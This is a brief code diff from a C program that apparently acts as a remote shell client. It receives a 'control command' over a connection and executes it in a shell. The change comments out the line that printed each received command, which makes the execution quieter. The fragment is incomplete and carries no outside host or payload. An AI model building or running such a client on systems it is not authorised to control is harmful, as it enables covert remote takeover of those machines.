@@ -88,7 +88,7 @@ int main(int argc , char *argv[])
             // add a NULL terminating character to the end of `cmd` buffer to make it a proper string (won’t print properly without it)
             cmd[recv_size] = '\0';
 
-            puts(cmd);
+          //  puts(cmd);
 
             // execute the control command in our shell
             out_fp = execcmd(cmd);
